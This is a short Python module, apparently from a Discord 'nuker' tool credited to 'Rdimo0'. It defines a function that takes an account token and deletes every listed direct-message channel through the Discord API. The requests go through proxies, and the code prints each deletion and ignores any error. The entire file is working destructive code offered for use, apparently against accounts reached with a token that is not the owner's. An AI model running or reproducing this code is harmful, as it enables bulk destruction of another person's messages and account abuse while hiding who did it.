#By Rdimo0
import requests
from colorama import Fore

from util.plugins.common import getheaders, proxy

def DmDeleter(token, channels):
    for channel in channels:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies=proxy(),
            headers=getheaders(token))
            print(f"{Fore.RED}Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")